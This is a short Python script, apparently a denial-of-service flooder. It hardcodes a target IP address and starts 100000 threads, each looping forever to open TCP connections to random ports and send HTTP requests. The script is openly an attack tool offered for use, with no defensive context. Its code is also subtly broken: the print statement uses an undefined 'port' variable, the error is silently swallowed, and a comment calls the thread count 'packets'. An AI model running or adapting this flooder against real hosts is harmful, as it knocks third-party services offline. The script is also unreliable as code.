import socket
import random
import threading

target = '110.34.38.255'  # Replace with target IP address
num_packets = 100000  # Number of packets to send

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, random.randint(1, 65535)))
            s.send(b'GET / HTTP/1.1\r\n\r\n')
            print(f'Sent packet to {target} on port {port}')
        except:
            pass

for i in range(num_packets):
    threading.Thread(target=attack).start()
